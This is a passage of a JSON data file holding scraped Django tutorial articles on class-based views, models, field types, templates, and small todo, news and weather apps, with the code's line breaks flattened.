GeeksList.as_view()),]Create a template in templates/geeks/geeksmodel_list.html,html<ul>\u00a0\u00a0\u00a0\u00a0<!-- Iterate over object_list -->\u00a0\u00a0\u00a0\u00a0{% for object in object_list %}\u00a0\u00a0\u00a0\u00a0<!-- Display Objects -->\u00a0\u00a0\u00a0\u00a0<li>{{ object.title }}</li>\u00a0\u00a0\u00a0\u00a0<li>{{ object.description }}</li>\u00a0\u00a0\u00a0\u00a0\u00a0<hr/>\u00a0\u00a0\u00a0\u00a0<!-- If objet_list is empty\u00a0 -->\u00a0\u00a0\u00a0\u00a0{% empty %}\u00a0\u00a0\u00a0\u00a0<li>No objects yet.</li>\u00a0\u00a0\u00a0\u00a0{% endfor %}</ul>Let\u2019s check what is there on http://localhost:8000/\u00a0Django CRUD (Create, Retrieve, Update, Delete) Class Based Generic Views :-CreateView \u2013 Class based Views DjangoDetailView \u2013 Class based Views DjangoUpdateView \u2013 Class based Views DjangoDeleteView \u2013 Class based Views DjangoFormView \u2013 Class Based Views DjangoMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "41cff8d2e709216404ee12a920f5f777",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "A Django model is the built-in feature that Django uses to create tables, their fields, and various constraints. In short, Django Models is the SQL of Database one uses with Django. SQL (Structured Query Language) is complex and involves a lot of different queries for creating, deleting, updating or any other stuff related to database. Django models simplify the tasks and organize tables into models. Generally, each model maps to a single database table.This article revolves about how one can use Django models to store data in the database conveniently. Moreover, we can use admin panel of Django to create, update, delete or retrieve fields of a model and various similar operations. Django models provide simplicity, consistency, version control and advanced metadata handling. Basics of a model include \u2013Each model is a Python class that subclasses django.db.models.Model.Each attribute of the model represents a database field.With all of this, Django gives you an automatically-generated database-access API; see Making queries.Example \u2013from django.db import models\u00a0\u00a0# Create your models here.class GeeksModel(models.Model):\u00a0\u00a0\u00a0\u00a0title = models.CharField(max_length = 200)\u00a0\u00a0\u00a0\u00a0description = models.TextField()Django maps the fields defined in Django models into table fields of the database as shown below.Using Django ModelsTo use Django Models, one needs to have a project and an app working in it. After you start an app you can create models in app/models.py. Before starting to use a model let\u2019s check how to start a project and create an app named geeks.pyRefer to the following articles to check how to create a project and an app in Django.How to Create a Basic Project using MVT in Django?How to Create an App in Django ?Creating a ModelSyntax\r\nfrom django.db import models\r\n        \r\nclass ModelName(models.Model):\r\n        field_name = models.Field(**options)\r\nTo create a model, in geeks/models.py Enter the code,# import the standard Django Model# from built-in libraryfrom django.db import models\u00a0\u00a0# declare a new model with a name \"GeeksModel\"class GeeksModel(models.Model):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# fields of the model\u00a0\u00a0\u00a0\u00a0title = models.CharField(max_length = 200)\u00a0\u00a0\u00a0\u00a0description = models.TextField()\u00a0\u00a0\u00a0\u00a0last_modified = models.DateTimeField(auto_now_add = True)\u00a0\u00a0\u00a0\u00a0img = models.ImageField(upload_to = \"images/\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# renames the instances of the model\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# with their title name\u00a0\u00a0\u00a0\u00a0def __str__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return self.titleWhenever we create a Model, Delete a Model, or update anything in any of models.py of our project. We need to run two commands makemigrations and migrate. makemigrations basically generates the SQL commands for preinstalled apps (which can be viewed in installed apps in settings.py) and your newly created app\u2019s model which you add in installed apps whereas migrate executes those SQL commands in the database file.So when we run,Python manage.py makemigrationsSQL Query to create above Model as a Table is created and Python manage.py migratecreates the table in the database.Now we have created a model we can perform various operations such as creating a Row for the table or in terms of Django Creating an instance of Model. To know more visit \u2013 Django Basic App Model \u2013 Makemigrations and MigrateRender a model in Django Admin InterfaceTo render a model in Django admin, we need to modify app/admin.py. Go to admin.py in geeks app and enter the following code. Import the corresponding model from models.py and register it to the admin interface.from django.contrib import admin\u00a0\u00a0\u00a0\u00a0\u00a0# Register your models here.\u00a0from .models import GeeksModel\u00a0\u00a0\u00a0\u00a0\u00a0admin.site.register(GeeksModel)\u00a0Now we can check whether the model has been rendered in Django Admin. Django Admin Interface can be used to graphically implement CRUD (Create, Retrieve, Update, Delete).To check more on rendering models in django admin, visit \u2013 Render Model in Django Admin InterfaceDjango CRUD \u2013 Inserting, Updating and Deleting DataDjango lets us interact with its database models, i.e. add, delete, modify and query objects, using a database-abstraction API called ORM(Object Relational Mapper). We can access the Django ORM by running the following command inside our project directory.python manage.py shellAdding objects.To create an object of model Album and save it into the database, we need to write the following command:>>> a = GeeksModel(\r\n         title = \u201cGeeksForGeeks\u201d,  \r\n         description = \u201cA description here\u201d,\r\n         img = \u201cgeeks/abc.png\u201d\r\n         )\r\n>>> a.save()\r\nRetrieving objectsTo retrieve all the objects of a model, we write the following command:\r\n>>> GeeksModel.objects.all()\r\n<QuerySet [<GeeksModel: Divide>, <GeeksModel: Abbey Road>, <GeeksModel: Revolver>]>\r\nModifying existing objectsWe can modify an existing object as follows:\r\n>>> a = GeeksModel.objects.get(id = 3)\r\n>>> a.title = \"Pop\"\r\n>>> a.save()\r\nDeleting objectsTo delete a single object, we need to write the following commands:\r\n>>> a = Album.objects.get(id = 2)\r\n>>> a.delete()\r\nTo check detailed post of Django\u2019s ORM (Object) visit Django ORM \u2013 Inserting, Updating & Deleting DataValidation on Fields in a ModelBuilt-in Field Validations in Django models are the default validations that come predefined to all Django fields. Every field comes in with built-in validations from Django validators. For example, IntegerField comes with built-in validation that it can only store integer values and that too in a particular range.Enter the following code into models.py file of geeks app.from django.db import modelsfrom django.db.models import Model# Create your models here.\u00a0\u00a0class GeeksModel(Model):\u00a0\u00a0\u00a0\u00a0geeks_field = models.IntegerField()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def __str__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return self.geeks_fieldAfter running makemigrations and migrate on Django and rendering above model, let us try to create an instance using string \u201cGfG is Best\u201c.You can see in the admin interface, one can not enter a string in an IntegerField. Similarly every field has its own validations. To know more about validations visit, Built-in Field Validations \u2013 Django ModelsMore on Django Models \u2013Change Object Display Name using __str__ function \u2013 Django ModelsCustom Field Validations in Django ModelsDjango python manage.py migrate commandDjango App Model \u2013 Python manage.py makemigrations commandDjango model data types and fields listHow to use Django Field Choices ?Overriding the save method \u2013 Django ModelsBasic model data types and fields listThe most important part of a model and the only required part of a model is the list of database fields it defines. Fields are specified by class attributes. Here is a list of all Field types used in Django.Field NameDescriptionAutoFieldIt An IntegerField that automatically increments.BigAutoFieldIt is a 64-bit integer, much like an AutoField except that it is guaranteed to fit numbers from 1 to 9223372036854775807.BigIntegerFieldIt is a 64-bit integer, much like an IntegerField except that it is guaranteed to fit numbers from -9223372036854775808 to 9223372036854775807.BinaryFieldA field to store raw binary data.BooleanFieldA true/false field.The default form widget for this field is a CheckboxInput.CharFieldIt is a date, represented in Python by a datetime.date instance.DateFieldA date, represented in Python by a datetime.date instanceIt is used for date and time, represented in Python by a datetime.datetime instance.DecimalFieldIt is a fixed-precision decimal number, represented in Python by a Decimal instance.DurationFieldA field for storing periods of time.EmailFieldIt is a CharField that checks that the value is a valid email address.FileFieldIt is a file-upload field.FloatFieldIt is a floating-point number represented in Python by a float instance.ImageFieldIt inherits all attributes and methods from FileField, but also validates that the uploaded object is a valid image.IntegerFieldIt is an integer field. Values from -2147483648 to 2147483647 are safe in all databases supported by Django.GenericIPAddressFieldAn IPv4 or IPv6 address, in string format (e.g. 192.0.2.30 or 2a02:42fe::4).NullBooleanFieldLike a BooleanField, but allows NULL as one of the options.PositiveIntegerFieldLike an IntegerField, but must be either positive or zero (0).PositiveSmallIntegerFieldLike a PositiveIntegerField, but only allows values under a certain (database-dependent) point.SlugFieldSlug is a newspaper term. A slug is a short label for something, containing only letters, numbers, underscores or hyphens. They\u2019re generally used in URLs.SmallIntegerFieldIt is like an IntegerField, but only allows values under a certain (database-dependent) point.TextFieldA large text field. The default form widget for this field is a Textarea.TimeFieldA time, represented in Python by a datetime.time instance.URLFieldA CharField for a URL, validated by URLValidator.UUIDFieldA field for storing universally unique identifiers. Uses Python\u2019s UUID class. When used on PostgreSQL, this stores in a uuid datatype, otherwise in a char(32).Relationship FieldsDjango also defines a set of fields that represent relations.Field NameDescriptionForeignKeyA many-to-one relationship. Requires two positional arguments: the class to which the model is related and the on_delete option.ManyToManyFieldA many-to-many relationship. Requires a positional argument: the class to which the model is related, which works exactly the same as it does for ForeignKey, including recursive and lazy relationships.OneToOneFieldA one-to-one relationship. Conceptually, this is similar to a ForeignKey with unique=True, but the \u201creverse\u201d side of the relation will directly return a single object.Field OptionsField Options are the arguments given to each field for applying some constraint or imparting a particular characteristic to a particular Field. For example, adding an argument null = True to CharField will enable it to store empty values for that table in relational database.Here are the field options and attributes that an CharField can use.Field OptionsDescriptionNullIf True, Django will store empty values as NULL in the database. Default is False.BlankIf True, the field is allowed to be blank. Default is False.db_columnThe name of the database column to use for this field. If this isn\u2019t given, Django will use the field\u2019s name.DefaultThe default value for the field. This can be a value or a callable object. If callable it will be called every time a new object is created.help_textExtra \u201chelp\u201d text to be displayed with the form widget. It\u2019s useful for documentation even if your field isn\u2019t used on a form.primary_keyIf True, this field is the primary key for the model.editableIf False, the field will not be displayed in the admin or any other ModelForm. They are also skipped during model validation. Default is True.error_messagesThe error_messages argument lets you override the default messages that the field will raise. Pass in a dictionary with keys matching the error messages you want to override.help_textExtra \u201chelp\u201d text to be displayed with the form widget. It\u2019s useful for documentation even if your field isn\u2019t used on a form.verbose_nameA human-readable name for the field. If the verbose name isn\u2019t given, Django will automatically create it using the field\u2019s attribute name, converting underscores to spaces.validatorsA list of validators to run for this field. See the validators documentation for more information.UniqueIf True, this field must be unique throughout the table.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "5bbcb6aa00345334a55a9575488b73ca",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Templates are the third and most important part of Django\u2019s MVT Structure. A template in Django is basically written in HTML, CSS, and Javascript in a .html file. Django framework efficiently handles and generates dynamically HTML web pages that are visible to the end-user. Django mainly functions with a backend so, in order to provide a frontend and provide a layout to our website, we use templates. There are two methods of adding the template to our website depending on our needs.We can use a single template directory which will be spread over the entire project.\u00a0For each app of our project, we can create a different template directory.For our current project, we will create a single template directory that will be spread over the entire project for simplicity. App-level templates are generally used in big projects or in case we want to provide a different layout to each component of our webpage.ConfigurationDjango Templates can be configured in app_name/settings.py,\u00a0\u00a0Python3TEMPLATES = [\u00a0\u00a0\u00a0\u00a0{\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Template backend to be used, For example Jinja\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'BACKEND': 'django.template.backends.django.DjangoTemplates',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Directories for templates\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'DIRS': [],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'APP_DIRS': True,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# options to configure\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'OPTIONS': {\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'context_processors': [\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'django.template.context_processors.debug',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'django.template.context_processors.request',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'django.contrib.auth.context_processors.auth',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0'django.contrib.messages.context_processors.messages',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0],\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0},\u00a0\u00a0\u00a0\u00a0},]Using Django TemplatesIllustration of How to use templates in Django using an Example Project. Templates not only show static data but also the data from different databases connected to the application through a context dictionary. Consider a project named geeksforgeeks having an app named geeks.\u00a0Refer to the following articles to check how to create a project and an app in Django.\u00a0How to Create a Basic Project using MVT in Django?How to Create an App in Django ?To render a template one needs a view and a URL mapped to that view. Let\u2019s begin by creating a view in geeks/views.py,\u00a0\u00a0Python3# import Http Response from djangofrom django.shortcuts import render\u00a0\u00a0# create a functiondef geeks_view(request):\u00a0\u00a0\u00a0\u00a0# create a dictionary to pass\u00a0\u00a0\u00a0\u00a0# data to the template\u00a0\u00a0\u00a0\u00a0context ={\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"data\":\"Gfg is the best\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"list\":[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0# return response with template and context\u00a0\u00a0\u00a0\u00a0return render(request, \"geeks.html\", context)Now we need to map a URL to render this view,\u00a0Python3from django.urls import path\u00a0# importing views from views..pyfrom .views import geeks_view\u00a0urlpatterns = [\u00a0\u00a0\u00a0\u00a0path('', geeks_view),]Finally create a template in templates/geeks.html,\u00a0HTML<!DOCTYPE html><html lang=\"en\"><head>\u00a0\u00a0\u00a0\u00a0<meta charset=\"UTF-8\">\u00a0\u00a0\u00a0\u00a0<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\u00a0\u00a0\u00a0\u00a0<meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\u00a0\u00a0\u00a0\u00a0<title>Homepage</title></head><body>\u00a0\u00a0\u00a0\u00a0<h1>Welcome to Geeksforgeeks.</h1>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0<p> Data\u00a0 is {{\u00a0 data }}</p>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0<h4>List is </h4>\u00a0\u00a0\u00a0\u00a0<ul>\u00a0\u00a0\u00a0\u00a0{% for i in list %}\u00a0\u00a0\u00a0\u00a0<li>{{ i }}</li>\u00a0\u00a0\u00a0\u00a0{% endfor %}</body></html>Let\u2019s check if it is working,\u00a0The Django template languageThis is one of the most important facilities provided by Django Templates. A Django template is a text document or a Python string marked-up using the Django template language. Some constructs are recognized and interpreted by the template engine. The main ones are variables and tags. As we used for the loop in the above example, we used it as a tag. similarly, we can use various other conditions such as if, else, if-else, empty, etc. The main characteristics of Django Template language are Variables, Tags, Filters, and Comments.\u00a0VariablesVariables output a value from the context, which is a dict-like object mapping keys to values. The context object we sent from the view can be accessed in the template using variables of Django Template.\u00a0Syntax{{ variable_name }}ExampleVariables are surrounded by {{ and }} like this:\u00a0\u00a0My first name is {{ first_name }}. My last name is {{ last_name }}. With a context of {\u2018first_name\u2019: \u2018Naveen\u2019, \u2018last_name\u2019: \u2018Arora\u2019}, this template renders to:\u00a0My first name is Naveen. My last name is Arora.To know more about Django Template Variables visit \u2013 variables \u2013 Django Templates\u00a0TagsTags provide arbitrary logic in the rendering process. For example, a tag can output content, serve as a control structure e.g. an \u201cif\u201d statement or a \u201cfor\u201d loop, grab content from a database, or even enable access to other template tags.Syntax{% tag_name %}ExampleTags are surrounded by {% and %} like this:{% csrf_token %}Most tags accept arguments, for example :\u00a0{% cycle 'odd' 'even' %}\n \u00a0Commonly used Tags\u00a0Commentcycleextendsiffor loopfor \u2026 empty loopBoolean OperatorsfirstofincludeloremnowurlFiltersDjango Template Engine provides filters that are used to transform the values of variables and tag arguments. We have already discussed major Django Template Tags. Tags can\u2019t modify the value of a variable whereas filters can be used for incrementing the value of a variable or modifying it to one\u2019s own need.\u00a0Syntax{{ variable_name | filter_name }}Filters can be \u201cchained.\u201d The output of one filter is applied to the next. {{ text|escape|linebreaks }} is a common idiom for escaping text contents, then converting line breaks to <p> tags.\u00a0Example{{ value | length }}If value is [\u2018a\u2019, \u2018b\u2019, \u2018c\u2019, \u2018d\u2019], the output will be 4.\u00a0\u00a0Major Template Filters\u00a0addaddslashescapfirstcentercutdatedefaultdictsortdivisiblebyescapefilesizefodivisible byrmatfirstjoinlastlengthline numberslowermake_listrandomsliceslugifytimetimesincetitleunordered_listupperwordcountCommentsTemplate ignores everything between {% comment %} and {% end comment %}. An optional note may be inserted in the first tag. For example, this is useful when commenting out code for documenting why the code was disabled.\u00a0Syntax{% comment 'comment_name' %}\n{% endcomment %}Example :{% comment \"Optional note\" %}\n    Commented out text with {{ create_date|date:\"c\" }}\n{% endcomment %}To know more about using comments in Templates, visit comment \u2013 Django template tags\u00a0Template InheritanceThe most powerful and thus the most complex part of Django\u2019s template engine is template inheritance. Template inheritance allows you to build a base \u201cskeleton\u201d template that contains all the common elements of your site and defines blocks that child templates can override. extends tag is used for the inheritance of templates in Django. One needs to repeat the same code again and again. Using extends we can inherit templates as well as variables.Syntax{% extends 'template_name.html' %} Example :assume the following directory structure:dir1/\n    template.html\n    base2.html\n    my/\n        base3.html\nbase1.htmlIn template.html, the following paths would be valid:\u00a0HTML{% extends \"./base2.html\" %}{% extends \"../base1.html\" %}{% extends \"./my/base3.html\" %}To know more about Template inheritance and extends, visit extends \u2013 Django Template Tags\u00a0\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "5dd0f380f0f7935d0b7e0e361e45344f",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Prerequisite : django installationDjango is a high-level Python Web framework based web framework that allows rapid development and clean, pragmatic design. today we will create a todo app created to understand the basics of Django. In this web app, one can create notes like Google Keep or Evernote.Modules required :\u00a0\u00a0django : install djangocrispy_forms :\u00a0pip install --upgrade django-crispy-formsbasic setup :Start a project by the following command \u2013\u00a0\u00a0django-admin startproject todo-siteChange directory to todo-site \u2013\u00a0\u00a0cd todo-siteStart the server- Start the server by typing following command in terminal \u2013\u00a0\u00a0python manage.py runserverTo check whether the server is running or not go to a web browser and enter http://127.0.0.1:8000/ as URL.Now stop the server by pressing\u00a0ctrl-cLet\u2019s create an app now.\u00a0python manage.py startapp todoGoto todo/ folder by doing : cd todo and create a folder with index.html file : templates/todo/index.htmlOpen the project folder using a text editor. The directory structure should look like this :\u00a0Now add todo app and crispty_form in your todo_site in settings.py.\u00a0Edit urls.py file in todo_site :\u00a0Python3from django.contrib import adminfrom django.urls import pathfrom todo import views\u00a0\u00a0urlpatterns = [\u00a0\u00a0\u00a0\u00a0#####################home_page###########################################\u00a0\u00a0\u00a0\u00a0path('', views.index, name=\"todo\"),\u00a0\u00a0\u00a0\u00a0####################give id no. item_id name or item_id=i.id ############\u00a0\u00a0\u00a0\u00a0path('del/', views.remove, name=\"del\"),\u00a0\u00a0\u00a0\u00a0########################################################################\u00a0\u00a0\u00a0\u00a0path('admin/', admin.site.urls),]Edit models.py in todo :\u00a0\u00a0Python3from django.db import modelsfrom django.utils import timezone\u00a0\u00a0class Todo(models.Model):\u00a0\u00a0\u00a0\u00a0title=models.CharField(max_length=100)\u00a0\u00a0\u00a0\u00a0details=models.TextField()\u00a0\u00a0\u00a0\u00a0date=models.DateTimeField(default=timezone.now)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def __str__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return self.titleEdit views.py in todo :\u00a0Python3from django.shortcuts import render, redirectfrom django.contrib import messages\u00a0\u00a0## import todo form and models\u00a0\u00a0from .forms import TodoFormfrom .models import Todo\u00a0\u00a0###############################################\u00a0\u00a0def index(request):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0item_list = Todo.objects.order_by(\"-date\")\u00a0\u00a0\u00a0\u00a0if request.method == \"POST\":\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0form = TodoForm(request.POST)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if form.is_valid():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0form.save()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return redirect('todo')\u00a0\u00a0\u00a0\u00a0form = TodoForm()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0page = {\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"forms\" : form,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"list\" : item_list,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\"title\" : \"TODO LIST\",\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0return render(request, 'todo/index.html', page)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0### function to remove item, it receive todo item id from url ##def remove(request, item_id):\u00a0\u00a0\u00a0\u00a0item = Todo.objects.get(id=item_id)\u00a0\u00a0\u00a0\u00a0item.delete()\u00a0\u00a0\u00a0\u00a0messages.info(request, \"item removed !!!\")\u00a0\u00a0\u00a0\u00a0return redirect('todo')Now create a forms.py in todo :\u00a0\u00a0Python3from django import formsfrom .models import Todo\u00a0\u00a0class TodoForm(forms.ModelForm):\u00a0\u00a0\u00a0\u00a0class Meta:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0model = Todo\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0fields=\"__all__\"Register models to admin :\u00a0\u00a0Navigate to templates/todo/index.html and edit it : link to index.html fileMake migrations and migrate it\u00a0\u00a0python manage.py makemigrations\r\npython manage.py migrateNow you can run the server to see your todo app\u00a0\u00a0python manage.py runserver\u00a0\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "493d86fe47c0297d7c7cfa1dff27973c",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Django is a high-level framework which is written in Python which allows us to create server-side web applications. In this article, we will see how to create a News application using Django.\u00a0We will be using News Api and fetch all the headline news from the api. Read more about the api here news api.Do the Following steps in command prompt or terminal:\u00a0\u00a0Open the newsproject folder using a text editor. The directory structure should look like this\u00a0\u00a0Create a \u201ctemplates\u201d folder in your newsapp and it in settings.pySettings .py\u00a0\u00a0In views.py \u2013In views, we create a view named index which takes a request and renders an html as a response. Firstly we import newsapi from NewsApiClient.\u00a0\u00a0# importing apifrom django.shortcuts import renderfrom newsapi import NewsApiClient\u00a0\u00a0# Create your views here.\u00a0def index(request):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0newsapi = NewsApiClient(api_key ='YOURAPIKEY')\u00a0\u00a0\u00a0\u00a0top = newsapi.get_top_headlines(sources ='techcrunch')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0l = top['articles']\u00a0\u00a0\u00a0\u00a0desc =[]\u00a0\u00a0\u00a0\u00a0news =[]\u00a0\u00a0\u00a0\u00a0img =[]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for i in range(len(l)):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0f = l[i]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0news.append(f['title'])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0desc.append(f['description'])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0img.append(f['urlToImage'])\u00a0\u00a0\u00a0\u00a0mylist = zip(news, desc, img)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return render(request, 'index.html', context ={\"mylist\":mylist})\u00a0Create a index.html in templates folder.\u00a0\u00a0html<!DOCTYPE html><html lang=\"en\" dir=\"ltr\">\u00a0\u00a0<head>\u00a0\u00a0\u00a0\u00a0<meta charset=\"utf-8\">\u00a0\u00a0\u00a0\u00a0<title></title>\u00a0\u00a0<link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\" integrity=\"sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T\" crossorigin=\"anonymous\"><!-- Optional theme -->\u00a0\u00a0</head>\u00a0\u00a0<body>\u00a0\u00a0\u00a0\u00a0<div class=\"jumbotron\" style=\"color:black\">\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0<h1 style =\"color:white\">\u00a0\u00a0\u00a0Get The latest news on our website\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</h1>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</div>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0<div class=\"container\">\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{% for new, des, i in mylist %}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0<img src=\"{{ i }}\" alt=\"\">\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0<h1>news:</h1> {{ new }}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{{ value|linebreaks }}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0<h4>description:</h4>{{ des }}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{{ value|linebreaks }}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0{% endfor %}\u00a0\u00a0\u00a0\u00a0</div>\u00a0\u00a0\u00a0\u00a0</body></html>\u00a0Now map the views to urls.py\u00a0\u00a0from django.contrib import adminfrom django.urls import pathfrom newsapp import views\u00a0\u00a0urlpatterns = [\u00a0\u00a0\u00a0path('', views.index, name ='index'),\u00a0\u00a0\u00a0\u00a0path('admin/', admin.site.urls),]Your output of the project should look like this \u2013\u00a0\u00a0https://media.geeksforgeeks.org/wp-content/uploads/20190626143109/screen_recorder_video_2019_26_6_14_29_59.mp4My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "0baed1203402b4a85b8db715e03cf96e",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In this tutorial, we will learn how to create a Weather app that uses Django as backend. Django provides a Python Web framework based web framework that allows rapid development and clean, pragmatic design.Basic Setup \u2013Change directory to weather \u2013cd weatherStart the server \u2013python manage.py runserverTo check whether the server is running or not go to a web browser and enter http://127.0.0.1:8000/ as URL. Now, you can stop the server by pressingctrl-cImplementation : python manage.py startapp mainGoto main/ folder by doing :cd main and create a folder with index.html file: templates/main/index.htmlOpen the project folder using a text editor. The directory structure should look like this :Now add main app in settings.pyEdit urls.py file in weather :from django.contrib import adminfrom django.urls import path, include\u00a0\u00a0\u00a0\u00a0urlpatterns = [\u00a0\u00a0\u00a0\u00a0path('admin/', admin.site.urls),\u00a0\u00a0\u00a0\u00a0path('', include('main.urls')),]edit urls.py file in main :from django.urls import pathfrom . import views\u00a0\u00a0urlpatterns = [\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0path('', views.index),]edit views.py in main :from django.shortcuts import render# import json to load json data to python dictionaryimport json# urllib.request to make a request to apiimport urllib.request\u00a0\u00a0\u00a0\u00a0def index(request):\u00a0\u00a0\u00a0\u00a0if request.method == 'POST':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0city = request.POST['city']\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0''' api key might be expired use your own 